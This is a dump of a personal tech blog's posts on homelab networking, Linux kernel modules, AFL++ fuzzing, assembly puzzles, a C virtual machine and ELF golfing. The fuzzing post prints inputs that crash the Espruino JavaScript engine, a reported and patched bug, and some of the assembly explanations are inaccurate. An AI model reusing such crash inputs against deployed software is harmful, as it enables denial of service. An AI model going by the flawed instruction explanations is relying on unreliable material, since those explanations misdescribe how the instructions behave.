[{"content":"Welcome to my blog, I will post things about cybersecurity, development and Linux. For more info check my about page and my socials.\n","date":"13 October 2023","permalink":"/","section":"","summary":"Welcome to my blog, I will post things about cybersecurity, development and Linux.","title":""},{"content":"","date":"13 October 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"13 October 2023","permalink":"/series/homelab/","section":"Series","summary":"","title":"Homelab"},{"content":"","date":"13 October 2023","permalink":"/categories/homelab/","section":"Categories","summary":"","title":"Homelab"},{"content":"Let me guide you through my journey for a simple homelab.\nIntroduction # The idea of this article is to document how I did things and why, and to help me remember how to setup X and Y if needed.\nPlans # We want to go from a basic setup to something simple:\nBefore After flowchart TD A[Internet] --\u003e B[IAP box] B --\u003e C[LAN] flowchart TD A[Internet] --\u003e B[IAP box] B --\u003e C[pi-hole] C --\u003e D[LAN] Doing so will allow us to manage and customize our network using our pi-hole, it will be the authority for many core services such as DNS or DHCP.\nIn the future I will show different setups and how I did them.\nSetup your IAP box # In order to setup our network, we will need to do some tweaks:\nForce a static IP for our pi-hole Set the DNS to our pi-hole Disable the DHCP to let our pi-hole do it Depending on your model and provider those steps will be different, google is your friend.\nInstall pi-hole # First, assing a static IP on your machine if you can\u0026rsquo;t set a static lease on your internet box.\nI installed pi-hole on a RPI4 using pip install pi-hole (depending on your setup you will want to RTFM instead).\nSetup pi-hole # The setup wizard is very easy to use and understand, once again if stuck, go check the doc.\nOnce all setup you will want to manage your DHCP: change the IP range, set the local domain, set static leases\u0026hellip; Don\u0026rsquo;t forget to set your gateway to your internet box.\nYou can then add new DNS blacklist to block more ads domains.\nYou should be ready to go by now, all your connected devices will use the pi-hole, once their previous DHCP lease expire.\nSetup wireguard # Now that your local devices are safer from ads, you want to be able to block those from anywhere, and manage your local network remotely.\napt install wireguard\nServer # # generate keys wg genkey \u0026gt; wg.key cat wg.key | wg pubkey \u0026gt; wg.pub # create conf cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/wireguard/wg.conf [Interface] Address = 10.0.0.1/24 SaveConfig = true ListenPort = 51820 PrivateKey = \u0026lt;priv key in wg.key\u0026gt; [Peer] PublicKey = \u0026lt;peer pub key in home.pub\u0026gt; AllowedIPs = 10.0.0.2/24 EOF # allow forwarding cat \u0026#39;net.ipv4.ip_forward = 1\u0026#39; \u0026gt; /etc/sysctl.conf # enable wg systemctl enable --now wg-quick@wg # check for service wg show Client # # generate keys wg genkey \u0026gt; home.key cat home.key | wg pubkey \u0026gt; home.pub # create conf cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/wireguard/home.conf [Interface] PrivateKey = \u0026lt;priv key in home.key\u0026gt; Address = 10.0.0.2/24 # same as Peer.AllowedIPs in server\u0026#39;s config DNS = 10.0.0.1 # use pi-hole [Peer] PublicKey = \u0026lt;server pub key in wg.pub\u0026gt; AllowedIPs = 10.0.0.0/24 Endpoint = \u0026lt;your box IP\u0026gt;:\u0026lt;forwarded port\u0026gt; EOF Internet box # Put your pi-hole in DMZ Create NAT/PAT rule for a port forwarding From your box to pi-hole\u0026rsquo;s wireguard port Once everything is setup, on your client: wg-quick up home should connect you to your local network.\nAlso, you should be able to manage your local machines: firefox http://pi.lan/admin should lead you to your pi-hole interface.\n","date":"13 October 2023","permalink":"/posts/homelab-00/","section":"Posts","summary":"How to setup a basic homelab network with a pi-hole","title":"Homelab - Part 1 - Basic network"},{"content":"","date":"13 October 2023","permalink":"/tags/network/","section":"Tags","summary":"","title":"network"},{"content":"","date":"13 October 2023","permalink":"/tags/pi-hole/","section":"Tags","summary":"","title":"pi-hole"},{"content":"","date":"13 October 2023","permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"13 October 2023","permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":"","date":"13 October 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"13 October 2023","permalink":"/tags/vpn/","section":"Tags","summary":"","title":"vpn"},{"content":"","date":"13 October 2023","permalink":"/tags/wireguard/","section":"Tags","summary":"","title":"wireguard"},{"content":"How to create a basic Linux Kernel Module.\nA LKM is like a .so library, and can run kernel-land.\nWritting your own kernel module will help you to understand how the system works and make you think about mallocing in the kernel twice before running the code.\nCode # Here is the bare minimum you have to code to get a working LKM:\n#include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; // Specify module licence, GPL to not taint the kernel MODULE_LICENSE(\u0026#34;GPL\u0026#34;); // Called on module load int init_module(void) { printk(KERN_INFO \u0026#34;MODULE loaded!\\n\u0026#34;); return 0; } // Called on module unload void cleanup_module(void) { printk(KERN_INFO \u0026#34;MODULE unloaded!\\n\u0026#34;); } Compile # The Makefile I use for my modules:\nobj-m += my_module.o all: sudo make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules install: sudo insmod ./my_module.ko uninstall: sudo rmmod my_module clean: sudo make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean Then just run make. A new my_module.ko should be here, this is your kernel module.\nInstall # sudo insmod ./my_module.ko # or make install In dmesg you should have a new line containing MODULE loaded!. Your module is loaded in the kernel.\nUninstall # sudo rmmod my_module # or make uninstall In dmesg you should have a new line containing MODULE unloaded!. Your module is deleted form the kernel.\nMISC # dmesg -C will clear the dmesg buffer watch 'dmesg | grep MODULE' will append the new messages of the module so you don\u0026rsquo;t have to re-run the command Afterwords # Starting to create a kernel module is pretty easy, you just have to be careful with the functions you call and how you code them. There are a lot of specific functions for the kernel only, and you must check them out before using them.\nIn the future I will discuss more about the internals of Linux and why using a kernel module is insanely powerfull and at the same time a pain to code.\n","date":"18 December 2022","permalink":"/posts/lkm-00/","section":"Posts","summary":"How to create a basic Linux Kernel Module.","title":"🔎 Linux Kernel Module - Introduction"},{"content":"","date":"18 December 2022","permalink":"/tags/c/","section":"Tags","summary":"","title":"c"},{"content":"","date":"18 December 2022","permalink":"/tags/lkm/","section":"Tags","summary":"","title":"lkm"},{"content":"","date":"18 December 2022","permalink":"/series/lkm/","section":"Series","summary":"","title":"LKM"},{"content":"","date":"18 December 2022","permalink":"/categories/lkm/","section":"Categories","summary":"","title":"LKM"},{"content":"","date":"18 December 2022","permalink":"/tags/low-level/","section":"Tags","summary":"","title":"low-level"},{"content":"","date":"18 July 2022","permalink":"/tags/bggp/","section":"Tags","summary":"","title":"bggp"},{"content":"","date":"18 July 2022","permalink":"/categories/binary-golfing/","section":"Categories","summary":"","title":"Binary golfing"},{"content":"","date":"18 July 2022","permalink":"/tags/fuzz/","section":"Tags","summary":"","title":"fuzz"},{"content":"","date":"18 July 2022","permalink":"/tags/golf/","section":"Tags","summary":"","title":"golf"},{"content":"","date":"18 July 2022","permalink":"/tags/js/","section":"Tags","summary":"","title":"js"},{"content":"","date":"18 July 2022","permalink":"/tags/reverse/","section":"Tags","summary":"","title":"reverse"},{"content":"So this summer - and it has been this for the past 2 years - the famous Binary Golfing Grand Prix took place online for it\u0026rsquo;s 3rd edition, and of course I decided to give it a try.\nAfter getting to try my best at golfing binaries ( see my golfing posts), I had to race this competition for fun and learn a lot about fuzzing - as I have never fuzzed before.\nWhat is fuzzing? # Fuzzing a binary is like bruteforcing a binary\u0026rsquo;s input (cmd args, input file\u0026hellip;) in order to get an odd behaviour, a bug or even the holy crash.\nThere are a lot of tools in order to help users to fuzz a binary and optimize the results (execs/s, payload mutation, harnesses\u0026hellip;) and they are pretty easy to use.\nThe first tutorials online and my own knowledge led me to the famous AFL, or more exactly it\u0026rsquo;s big brother AFL++. So I will go with this tool for this grand prix in order to familiarize myself with it.\nChosing target # If you want to follow my journey in the real events timeline, click here.\nLooking by curiosity what are all the known JavaScript engines (and there are a lot of them), one caught my attention: Espruino.\nI thought this project was in the spirit of the minimalism, and thus wanted to see if it was enough to avoid crashes.\nEspecialy design for embeeded devices and IoT, still maintained after more than 7 years, this project was a good practice for fuzzing.\nInstrumentation # For this fuzzing project, I used the AFL++ Docker container, mapping the code of the target in /src.\nThe first step for fuzzing, we have to prepare the target binary. ALF uses a custom GCC in order to optimize results and explore the binary. We have to build the binary from source and patch the Makefile.\n--- a/Makefile +++ b/Makefile @@ -1,8 +1,12 @@ - CC = gcc + CC = afl-gcc In more complex project, you will have to also change the compiler to alf-clang-fast++, add some compilation flags for optimizations, and even have to patch the main() {} function for AFL.\nOn compilation you should see some warnings/infos from AFL:\nI will copy the built binary in /usr/local/bin/, and create a new directory for this fuzzing:\ncd $HOME mkdir in # our inputs for the fuzzer mkdir out # outputs of the fuzzer (crashes, test queue...) Minimizing test cases # The next step is to get good test cases to speed up the process of fuzzing. The fuzzer will base its mutations on those test cases, so the more unique tests you have, the better.\nBy chance, most projects have good tests in their /tests/ directory, so let\u0026rsquo;s copy them to our inputs:\ncp /src/tests/*.js in/ Once again, for optimizations, it is a good practice to minimize the test cases, it can save a lot of time during fuzz.\nmkdir min # our minimized inputs afl-cmin -i in -o min -- $TARGET @@ # minify the tests for the target # the \u0026#39;@@\u0026#39; stands for the input file # ie. for the target /bin/cat, we would use: # afl-cmin -i in -o min -- /bin/cat @@ After running the command (this will take a while if you have hundreds of cases) we now have a lot more efficient test cases in our min dir.\nFuzzing # Now that we have our test cases ready, let\u0026rsquo;s get to fuzing!\nAs simple as that:\nafl-fuzz -i min -o out -- $TARGET @@ We can also add the -D options for mutating random bytes in the payload, and it is recommanded for better results, despite of increasing by a lot the time of fuzzing.\nYou can multithread AFL:\n# create a master process afl-fuzz -M name1 -- $TARGET @@ # create a slave afl-fuzz -S name2 -- $TARGET @@ The processes will communicate together and trade their payloads.\nGetting a crash # Within a few minutes I got a crash on the binary with fuzzing, and I got hundreds the first day, pretty nice.\nThe first crashes were \u0026ldquo;only\u0026rdquo; some SEGFAULT, and the files were also already a bit tiny: 79 bytes for a crash.\nSo my first crash was due to the following file (base64):\nZnVuY3Rpb64gZigpIHsKfQoKYSA9IFsKICB2b2lkIDAsCiAgdm9pZCBmLAogIHZvaWQgZigpCl07 CgpyZXN1bHQgPSBhID09ICIsLCI7Cg== Which gives:\nfunctio f() { } a = [ void 0, void f, void f() ]; result = a == \u0026#34;,,\u0026#34;; This code crashes Espruino with no error message, only a SEGFAULT. My guess here was that the parsing code had an issue with the functio f() {} part, and crashes the program, maybe a lexer issue due to invalid token?\nAfter some time I managed to minimize the payload down to 4 bytes: da5sCg== or in hex 75ae 6c0a. So I have here a 4-bytes SEGFAULT.\nI also got one buffer overflow of 1.5kB but I never managed to reproduce it on any other system, I concluded that this was a glitch in the matrix and cried a lot, because usualy you only get SEGFAULT or SIG_ABORT crashes, a BoF would have been the cherry on top.\nBut I got a lot of crashes tho:\n(Don\u0026rsquo;t mind the low amount of exec/s here, the first day I got ~100 exec/s but with time it decreased due to the size of the payloads in the corpus)\nBonus points # With only 4 bytes there was only a few bytes of improvement possible, so I decided to dig into the bug. Too bad that this caused only a SEGFAULT.\nAfter some time of code analysis, coding, guessing and compiling, I managed to patch the bug in an ugly way, but made a pull request anyways, which was not merged, but instead the developpers made an other patch in order to fix this. So I guess this counts?\nLink of the final patch.\nStruggles (or real history) # In this section you will read the truth about my fuzzing journey, how much time it took, my mistakes and so on\u0026hellip;\nAct I: shock # The day I started to run for this competition, radareorg released a new version of their radare2 tool. Imagine getting a crash on the latest version of one of your favorite tools 😍\nI started to fuzz like I explained in this post, but after days of fuzzing, all I had was a corpus of 2000 files and 6 hangs, which does not count as crash.\nThe bad part was also that I only had like 8-12 exec/s, which is very slow. And I had no clues about why and how.\nAct II: denial # It was not my fault, right?\nSo I decided to switch of target. I went for Python 3.8. After building it, making test cases and min them, a day passed, and I started to fuzz for the night. Nothing after hours, not even a new find. There was a problem somewhere. It must be Python, I was thinking. Of course it was Python the problem, not me.\nI switched of target many times, here is what I tried (you can try yourself to fuzz them if you want):\nls $HOME/fuzz SimpleNES nvim radare2 PcapPlusPlus dlib inih polybar sql-parser SameBoy feh nasm python vim Act III: anger # After trying dozens of projects to fuzz, I started to be a bit angry, or more precisely frustrated. I was trying to fuzz a binary to get a crash, but I got nothing for the past week. Angry at myself that I couldn\u0026rsquo;t setup a simple fuzzing lab.\nAct IV: bargaining # In order to save myself of myself, I started to try a lot of things, with my newly gained experience in fuzzing, I decided to go back to my original idea: radare2.\nWith that, I also read the manual and all the options for AFL++ in order to get better results, I even asked online for help, of course SoEaSy DMed me to help. He wasted some time with me, and we supposed that the low amount of exec/s was due to the fact that I start r2 in interactive mode, and the process limit itself to a certain amount of threads, so the time the process kill itself in order to spawn a new one, it limits a lot the number of execs.\nHe also asked me to try other binaries of the radare2 suite, even to write a harness for a specific function to fuzz.\nAct V: depression # Even with those tweaks and tries, there were no improvements in my results after 5 days of fuzzing. 😢\nI decided to take a break for days.\nAct VI: testing # After my break I wanted to know why I did not have any results with my fuzzing. And for me the obvious reason was an issue of the famous 8th layer of the OSI model: the keyboard-chair interface.\nFor my previous choices, either it was a bad target, or I did things wrong.\nAct VII: acceptance # The only way forward for me was to find an other target, and see if I get a crash easily.\nNow that you have the past history of the project, see the real fuzzing journey.\nConclusion # I made 11th out of 33 and I am very happy about that\nHere you will find the final results including all the submitted entries for this year!\n","date":"18 July 2022","permalink":"/posts/bggp3/","section":"Posts","summary":"So this summer - and it has been this for the past 2 years - the famous Binary Golfing Grand Prix took place online for it\u0026rsquo;s 3rd edition, and of course I decided to give it a try.","title":"🏌️ BGGP3 - How to crash a famous JS engine for fun"},{"content":" Forewords # So recently a coworker of mine showed a book about assembly poems, at first I was like \u0026ldquo;well this joke is very funny\u0026rdquo; and then I read the first page. 5 minutes later I ordered the same book for my own, and now that it has been received, I want to write my notes here.\nThere is an online and free version of the book.\nI will try to understand each 64 pages of this awesome work, in order to maintain my assembly knowledge and to learn new tricks.\nOf course I can be wrong in my interpretations of certain code or instructions, if so, feel free to help me improve!\n0x00 # xor eax,eax lea rbx,[0] loop $ mov rdx,0 and esi,0 sub edi,edi push 0 pop rbp The first page is pretty straightforward. As you can see every line sets one register to 0.\nEvery instruction here is very common and easy to understand, but one thing caught my attention: loop $. So let\u0026rsquo;s dig a bit here.\nloop \u0026lt;label\u0026gt; can be resumed like so:\nloop: ; if cx == 0 jmp to end test cx, cx jnz $+3 dec cx jmp loop As you can see, it decrements cx at each iteration until it is 0. So a loop $ would simply set cx to 0, as the label to loop through is $, the symbol for the actual address.\nNormally with loop label you would have some code between label and the loop instruction, but here there is none, so the loop only decrements cx.\nPretty sneaky trick.\n0x01 # .loop: xadd rax,rdx loop .loop This one is a little trick and pretty obfuscated but was very quick to understand. In fact, this loop produces the fibonacci sequence for the first cx elements.\nAs we learnt about loop at 0x00, it loops until cx equals 0, and here there is one instruction which gets exectued within the loop.\nxadd is quite uncommon, this instruction can be coded as:\nxadd: ; swap rax and rdx xchg rax, rdx ; rdx = rdx + rax mov r8, rdx add r8, rax mov rdx, r8 One experienced programmer can spot the algorithm to compute the fibonacci sequence here, which calculate the sum of the two previous elements of the sequence.\n0x02 # neg rax sbb rax,rax neg rax This code was a bit tricky, after discussing with friends (xThaz \u0026amp; SoEaSy) we agreed to say that this code tells if rax is different than 0.\nAt first I said that it tells the sign of rax, but I missunderstood the sbb instruction, but I was wrong and overlooked the computing of the sbb rax, rax.\nThis code requires to look at neg at first, despite of switching the sign of the target, it also sets the carry flag CF accordingly with the sign.\nWe can now dig sbb, its code can be:\nsbb: ; rax is argv[0] ; rbx is argv[1] mov r8, rax add r8, CF sub rbx, r8 By looking at the possible output values, we van see that it is a substraction by either rax + 0 or rax + 1 of rbx. Given that in this code, we have sbb rax, rax, we can sse that we will only get rax = rax - (rax + CF), with CF at 0 or 1, thus the output of the instruction is either 0 or 1, corresponding to the initial sign of rax.\n0x03 # sub rdx,rax sbb rcx,rcx and rcx,rdx add rax,rcx With the previous experiences we now know about all the above instructions, we can deduce the behaviour of the code, which can be coded in a more high-level language like Python:\ndef my_func(rax, rdx): if rax \u0026gt; rdx: rax += rdx Yes, this is that simple. The tricky part comes from the sbb and and part.\nsub rdx, rax stores the difference in rdx, and sets the CF if needed. sbb rcx, rcx sets rcx to neg CF (either 0 or 0xffffffff) and rcx, rdx If rax was lower than rdx at line 1: rcx would be 0 and then the and sill still set rcx to 0 If rax was greater than rdx at line 1: rcx would be 0xffffffff and so, rcx becomes the value of rdx add rax, rcx is trivial now So 0x03 adds rdx to rax if rax \u0026gt; rdx.\n0x04 # xor al,0x20 This code was pretty simple to test, I was unsure of the exact behaviour of it, so I tested it:\nfor x in range(255): print(chr(x), chr(x ^ 0x20)) And as you can see by executing this code, the printable characters have their case swapped: lowercase letters become upperccase, and vice-versa.\n0x05 # sub rax,5 cmp rax,4 This code is so tiny that it seems complex, but fear not, I think I have the solution for it. This code shows the similarities and difference beteween sub and cmp.\nsub rax, 5 actually overwrites the value of rax cmp rax, 4 computes sub rax, 4 and only stores the result in the flags, rax is not modified 0x06 # not rax inc rax neg rax This code teaches the trick for those instructions:\nnot rax does the two\u0026rsquo;s-complement for the value -\u0026gt; not 0x5 = 0xfffa inc rax; neg rax does the same -\u0026gt; neg 0x6 = 0xfffa 0x07 # inc rax neg rax inc rax neg rax This code shows us that the inc; neg is symetric: doing it twice leads us to the original value. Which is pretty logic as inc; neg is the same as neg.\n0x08 # add rax,rdx rcr rax,1 rcr is not quite common, it rotates the bits to the right.\nIn fact, there is stuff hapenning with the CF but I will skip this part as it is too long.\n0x09 # shr rax,3 adc rax,0 shr is a right shift of bits, with storing into CF for overflowing last bit. This does the same as dividing by 2^n, with shr rax, n.\nadc is add with the CF in addition:\n; rax is argv[1] ; rbx is argv[2] adc: add rax, rbx add rax, CF So here the code divides rax by 8 (2^3) and if the 3rd bit was 1, it increases rax, we can rewrite this code in Python to make things clearer:\ndef nine(a): cf = a \u0026amp; 0b100 result = a / 3 result += cf return result 0x0a # add byte [rdi],1 .loop: inc rdi adc byte [rdi],0 loop .loop Now it gets a bit interesting.\nadd byte [rdi], 1 increases the value of what is pointed by the address at rdi.\ninc rdi adds 1 to rdi without modifing the CF.\nadc byte [rdi], 0 writes the content of CF at the address pointed by rdi.\nloop .loop -\u0026gt; dec cx; jmp short .loop.\nMy guess here is that it sets every bytes in memory (at the address pointed by rdi) to the content of CF. The size of the memory is rcx, and the first byte is set to 1 in order to identify the chunck (like a start bit in telecommunications).\n0x0b # not rdx neg rax sbb rdx,-1 Here I got stuck for at least one hour, and because we had already seen all instructions, I did not bothered re-reading the documentation. It is pointless to read something twice, right?\nSo after calling the joker \u0026ldquo;coworker help\u0026rdquo;, we saw that neg does not only the 2-complement of the register, but also sets CF to 1 if the register is not 0. Remember to always double check what you read, especially documentation.\nSo this code invert all bits of rdx, and if rax is not 0, it will decrement rdx by 1.\n0x0c # mov rcx,rax xor rcx,rbx ror rcx,0xd ror rax,0xd ror rbx,0xd xor rax,rbx cmp rax,rcx Despite the number of lines, this code was very easy to understand, in fact I was even able to guess (CTF player strenght here) the behaviour of it within a few seconds.\nThe code acts in two steps, and demonstrates that a ror + xor is the same as a xor + ror.\nThe first 3 lines copies rax into rcx and xor rcx, rbx, and then does a ror rcx, 0xd. The other next 3 lines does the opposite: ror rax, 0xd (and also ror rbx, 0xd) and xor rax, rbx.\nFinally we see that both rax and rcx have the same value. Proving that ror;xor is commutative.\n0x0d # mov rdx,rbx xor rbx,rcx and rbx,rax and rdx,rax and rax,rcx xor rax,rdx cmp rax,rbx This does the same as 0x0c but for xor; and \u0026amp; and; xor. Nothing really outstanding.\n0x0e # mov rcx,rax and rcx,rbx not rcx not rax not rbx or rax,rbx cmp rax,rcx Same goes for and; not \u0026amp; not; or.\n0x0f # .loop: xor byte [rsi],al lodsb loop .loop ","date":"18 June 2022","permalink":"/posts/xchg-rax-rax/","section":"Posts","summary":"Or how to learn assembly optimization tricks.","title":"🔎 xchg rax, rax"},{"content":"","date":"18 June 2022","permalink":"/tags/assembly/","section":"Tags","summary":"","title":"assembly"},{"content":"This is the second part of my series about creating a custom virtual machine: part 1 - assembly VM.\nThe code is here: https://github.com/OxNinja/C-VM\nIntroduction # Doing the PoC in assembly (see part 1) gave me enough information about how to create my own virtual machine, I got the basic concepts for such a subject, such as:\nParsing opcode Emulating instruction Use of virtual registers It also showed me the limitations of this language, I needed a more sofisticated yet low level one, C was the perfect match 🥵.\nArchitecture # I came with the following flow for the VM:\ngraph LR; A[Registers init] --\u003e B[Emulate opcode] B --\u003e C{Parsing} C --\u003e|Good opcode| D[Exec instruction] C --\u003e|Unknown opcode| E[Nothing happens] D --\u003e F[Loop] E --\u003e F[Loop] F --\u003e B PoC||GTFO # Let\u0026rsquo;s break down how I created this VM.\nRegisters # In order to store information such as inputs or outputs, I needed some registers. These must be readable and writeable from anywhere in my program, I needed to make either a forbidden global variable, or create a local one which will be passed to the used functions. I went with the second solution, as it is less dirty, and I wanted to try my best by using pointers and C stuff.\nI created a struct for my registers:\ntypedef struct Registers { // common operations registers int a, b, c, d; // array to work with when manipulating registers\u0026#39; indexes // each element will point to the address of the correspponding register // see `setup_registers()` for more details int *registers[4]; // flags are stored in one integer, using masks to extract them // remainder, zero (cmp) int flags; } Registers; I started to work with only 4 registers a, b, c, d and one for the flags after instruction\u0026rsquo;s execution.\nI also needed a way to (re)set the said registers to whatever I wanted, so I created this reset function:\n/* Set all registers in the array in order to easyliy manupulate them * like: regs-\u0026gt;registers[2] = 0x2a; * is the same as: regs-\u0026gt;c = 0x2a; */ void setup_registers(Registers *regs) { // each element of the array points to the corresponding register\u0026#39;s address regs-\u0026gt;registers[0] = \u0026amp;regs-\u0026gt;a; regs-\u0026gt;registers[1] = \u0026amp;regs-\u0026gt;b; regs-\u0026gt;registers[2] = \u0026amp;regs-\u0026gt;c; regs-\u0026gt;registers[3] = \u0026amp;regs-\u0026gt;d; } /* Just print the values */ void print_registers(Registers *regs) { printf(\u0026#34;=== Registers: ===\\n\u0026#34;); printf(\u0026#34;a: 0x%x\\n\u0026#34;, regs-\u0026gt;a); printf(\u0026#34;b: 0x%x\\n\u0026#34;, regs-\u0026gt;b); printf(\u0026#34;c: 0x%x\\n\u0026#34;, regs-\u0026gt;c); printf(\u0026#34;d: 0x%x\\n\u0026#34;, regs-\u0026gt;d); printf(\u0026#34;flags: 0x%x\\n\u0026#34;, regs-\u0026gt;flags); } /* Force the values of the registers to 0 */ void reset_registers(Registers *regs) { regs-\u0026gt;a = 0; regs-\u0026gt;b = 0; regs-\u0026gt;c = 0; regs-\u0026gt;d = 0; regs-\u0026gt;flags = 0; } Emulation # Emulating an instruction is very basic:\nParse the input Detect the corresponding instruction Execute the instruction But I wanted to do something a bit fancy here: instead of just make a big 0xswitch statement, I created a map, or more precisely an array of pointers of functions. Meaning that each entry of the array is a pointer, pointing to the corresponding function to call:\nvoid emulate(Registers *regs, int shellcode) { // parsing the input to extract only the opcode int opcode = (shellcode \u0026amp; 0xff000000) \u0026gt;\u0026gt; 0x18; // instructions is an array of pointers of function // each index points to the according function corresponding to the opcode // it is very easy to change the opcode for a certain function void (*instructions[10])(Registers *, int); // no opcode 0 defined for the moment instructions[1] = my_mov; instructions[2] = my_push; instructions[3] = my_add; instructions[4] = my_sub; instructions[5] = my_jmp; instructions[6] = my_cmp; instructions[7] = my_call; instructions[8] = my_exit; instructions[9] = my_pop; // code ommited for future spoilers redacted(); } Why this \u0026ldquo;crazy\u0026rdquo; stuff instead of the good old switch? You may ask. Well, for the sake of simplicity, yes, s i m p l i c i t y, I used this strategy for a good reason:\n// calling the corresponding function only takes 1 line of code, // and no processing at all: no if, nor loop (*instructions[opcode])(regs, shellcode); Then each function, such as my_mov and so, do the wanted behaviour of the corresponding instruction, for example:\n/* Moves the value into the register * value is either a register or a plain hex integer */ void my_mov(Registers *regs, int shellcode) { int is_reg1 = (shellcode \u0026amp; 0x00f00000) \u0026gt;\u0026gt; 0x14; if (is_reg1 == 0x1) { // get index of target reg int target_reg = (shellcode \u0026amp; 0x000f0000) \u0026gt;\u0026gt; 0x10; // get value to mov int is_reg2 = (shellcode \u0026amp; 0x0000f000) \u0026gt;\u0026gt; 0xc; // get moved value int value = (shellcode \u0026amp; 0x00000fff); // if source is a register and not a value if (is_reg2 == 0x1) { int source_reg = value \u0026gt;\u0026gt; 0x8; value = *regs-\u0026gt;registers[source_reg]; } // finally, move the value into the register *regs-\u0026gt;registers[target_reg] = value; } else { except(\u0026#34;Invalid value for mov (arg a is not a register)\u0026#34;); } } Which leads to my next subject: parsing.\nParsing # Yes, I did not mentionned how my instructions are encoded and how to parse them. See the following scheme to understand my way of crafting one instruction:\nopcode isReg1 value1 isReg2 value2 01 1 0 0 045 This instruction (0x1100045) is a mov a, 0x45. Yes this is a bit silly but here is an another scheme in order to better explain my way of encoding my instructions:\ngraph LR; A[opcode] --\u003e B[isReg1] B --\u003e|==1| C[value1, index of register] B --\u003e|==0| D[value1, plain hex] C --\u003e E[isReg2] D --\u003e E E --\u003e|==1| F[value2, index of register] E --\u003e|==0| G[value2, plain hex, left 0-padded] And here is the size of each portion of the instruction:\nopcode: word isReg1: byte value1: byte if isReg1 == 1, any size else (depends on the instruction) isReg2: byte value2: byte if isReg2 == 1, any size else (depends on the instruction) I made the choice to use a constant-sized instruction set, to help me parsing each one, instead of having to hardcode every variant that a variable-length instruction set would require.\nOnce this logic has been declared, there was one thing left to do: actually parsing the instructions. In fact, as you may have noticed in my instruction functions (my_mov() my_add()...), I used binary masking and shifting like so: (a \u0026amp;\u0026amp; 0xff) \u0026gt;\u0026gt; 0x10.\nStack implementation # This is propably the most difficult thing in this project for me, as I had to figure out how to implement a virtual stack and related stuff.\nI first thought about using a pointer to a malloced chunck as the stack, where I could store pointers to the values, so here is the struct:\ntypedef struct Stack { // LIFO stack // max size of the stack int max_size; // pointers for the stack int *stack, *stack_base, *stack_end, **stack_pointer; } Stack; A few explanations about this propably cursed struct:\nmax_size is the size of the stack (max number of pointer that could be stored in it). *stack is a pointer to the allocated chunk in memory to store the pointers. *stack_base is a pointer to the base of the stack (the first place to store pointers at). *stack_end is a pointer to the end of the stack (the limit of its size). **stack_pointer is a pointer of the current \u0026ldquo;cursor\u0026rdquo; in the stack, pointing to the stored pointer in it. flowchart LR subgraph Stack direction LR subgraph *stack direction LR 0x00 --\u003e 0x55ff1111 0x08 --\u003e 0x55ff2222 0x10 --\u003e 0x55ff3333 0x18 --\u003e 0x55ff4444 ... --\u003e 0x... max_size --\u003e ??? end **stack_pointer --\u003e 0x18 *stack_base --\u003e 0x00 *stack_3nd --\u003e max_size end Feel free to visit the project\u0026rsquo;s repo to check if I finished this implementation, but by now I am for sure struggling with this.\nIn fact with this virtual stack the VM is now able to push \u0026amp; pop and all that stuff, here is how I implemented them:\nvoid my_push(Registers *regs, Stack *stack, int shellcode) { // get the value to push int value = shellcode \u0026amp; 0x00ffffff; // get a pointer to the value int *pointer = \u0026amp;value; // make the stack pointer pointing to the pointer 🧠 👉 👈 *stack-\u0026gt;stack_pointer = pointer; // increment the cursor for the top of the stack stack_inc(stack); } The same goes for the pop, except that we first decrement the stack pointer index, as we incremented it last, and then we store the value pointed into the corresponding register.\nDemo time # I used the following code:\nint main(void) { // init the struct Registers regs; // setup the registers\u0026#39; array setup_registers(\u0026amp;regs); // set everything to 0 reset_registers(\u0026amp;regs); print_registers(\u0026amp;regs); // mov a, 0x45 emulate(\u0026amp;regs, 0x1100045); print_registers(\u0026amp;regs); // mov c, 0x2 emulate(\u0026amp;regs, 0x1120002); print_registers(\u0026amp;regs); // exit(a) emulate(\u0026amp;regs, 0x8000000); // yes, pointless return but it is for the personnal ethics return 0; } Special thanks to:\nMasterfox: for helping me debugging my issues with pointers and structs Nofix: for helping me debugging my array of pointers of functions stuff ","date":"9 May 2022","permalink":"/posts/c-vm/","section":"Posts","summary":"The second part of my series on low-level learning journey, let\u0026rsquo;s build the VM in C this time!","title":"🔎 Creating a VM for fun - Part 2: C"},{"content":"","date":"9 May 2022","permalink":"/series/custom-vm/","section":"Series","summary":"","title":"Custom VM"},{"content":"","date":"9 May 2022","permalink":"/categories/custom-vm/","section":"Categories","summary":"","title":"Custom VM"},{"content":"","date":"15 April 2022","permalink":"/tags/binary/","section":"Tags","summary":"","title":"binary"},{"content":"","date":"15 April 2022","permalink":"/tags/elf/","section":"Tags","summary":"","title":"elf"},{"content":" So tmp.out - once again - got me. Especially netspooky, which wrote about golfing binaries. I was instantly caught in golfing.\nBinary golfing? # Crafting the smallest binary which does a particular task.\nWhy someone would do this?\nLearn about binary executables and format parsers Flex on muggles My notes on ELF format # It is recommanded to code in assembly in order to manage your headers as you wish.\nWe can handcraft binaries, because GCC is a bit messy when compiling code and linking stuff. We can then make sections or headers overlap to save more space.\nIn brief, the section header table is for use by the compiler and linker, while the program header table is for use by the program loader. The program header table is optionnal and never present in practice, the section header table is also optional but always present.\nBrian Raiter, \u0026ldquo;A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux\u0026rdquo; Compile # Classic way:\nnasm -f elf32 file.s ld -m elf_i386 -nmagic file.o -o bin Better:\nnasm -f bin file.s To directly craft a binary from NASM file.\nHeader # The smallest valid header I can think of might be:\n7f45 4c46 01?? ???? ???? ???? ???? ???? 0200 0300 0100 ???? dead beef 2c00 0000 ???? ???? ???? ???? 3400 2000 0100 0000 ???? ???? 0000 0008 0000 0008 !!!! !!!! !!!! !!!! 0500 0000 0010 0000 Considering the following:\n??: garbage, so you can just use those bytes for your code !!!! !!!!: total size of the header, so it will depend on your code dead beef: address of the entrypoint Here is a template I modified from here, so all creds to the author:\nbits 32 org 0x8000000 ehdr: ; Elf32_Ehdr db 0x7F, \u0026#34;ELF\u0026#34;, 1, 1, 1, 0 ; e_ident times 8 db 0 dw 2 ; e_type dw 3 ; e_machine dd 1 ; e_version dd _start ; e_entry dd phdr-$$ ; e_phoff dd 0 